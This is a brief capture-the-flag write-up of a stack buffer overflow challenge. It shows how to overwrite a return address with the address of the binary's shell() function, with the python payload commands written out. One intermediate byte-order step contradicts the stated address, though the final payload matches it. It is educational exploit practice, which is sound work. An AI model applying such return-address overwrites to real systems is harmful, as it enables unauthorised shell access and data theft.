# Stack buffer overflow basic 2 Write up

We see that this is an example where we will want to use the buffer to overflow the return address of the stack too the address of our `shell()` function.

We first need to get the exact number of bytes for our buffer, then append our payload onto it after that.


We also know that the computer is little endian, so we will need to enter our return address backwards.

```sh

(python -c 'print("a"*128 + OUR_ADDRESS_HERE)'; cat -) | ./ch15

```

Using `objdump -d ch15`, we see that the address of the `shell` function is at `0x08048516`. Using this information, we can now design our payload:

\x08\x04\x85\x15 -> big endian

turns into

\x15\x85\x04\x08 -> little endian
```sh

(python -c 'print("a"*128 + "\x16\x85\x04\x08")'; cat -) | ./ch15

```

and we get the password after using our new shell and doing `cat .passwd`
